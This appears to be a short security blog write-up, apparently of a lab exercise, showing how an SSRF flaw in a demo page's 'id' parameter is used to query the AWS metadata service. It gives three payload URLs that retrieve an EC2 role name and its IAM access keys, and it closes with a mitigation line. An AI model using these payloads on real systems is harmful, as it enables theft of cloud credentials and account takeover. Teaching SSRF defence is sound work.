---
title: Stealing AWS IAM Credentials via SSRF
date: 2025-12-27 14:30:00 +0200
categories: [Cloud, Web]
tags: [network, ssrf, aws, burpsuite]
---

## Phase 1: Discovery

I started by accessing the target website at: `http://54.166.141.194/index.html`
While browsing, I found a "Free Demo" page at: `http://54.166.141.194/demo.html`

## Phase 2: Interception

I decided to investigate how this page fetches data. I used **Burp Suite** to intercept the HTTP request.
I noticed a suspicious parameter named `id` that takes a URL as input.

![Burp Request Intercept](/assets/img/Screenshot_1.png)

## Phase 3: Exploitation (The Attack)

To test for Server-Side Request Forgery (SSRF), I injected the AWS Metadata IP address into the `id` parameter.

**Payload 1: Confirming SSRF**
`http://169.254.169.254/latest/meta-data/`

The server responded with the directory listing! This confirms the server is hosted on AWS and vulnerable to SSRF.

**Payload 2: Finding the Role Name**
I navigated through the metadata to find the IAM Role name:
`http://169.254.169.254/latest/meta-data/iam/security-credentials/`

Response: `ec2-prod-role`

**Payload 3: Stealing the Keys**
Finally, I extracted the Access Keys and Session Token:

`http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role`

## Result

I successfully retrieved the sensitive AWS credentials (AccessKeyId, SecretAccessKey).

![Final Credentials Proof](/assets/img/Screenshot_2.png)

## Mitigation

Block access to `169.254.169.254` at the firewall level or enforce IMDSv2.
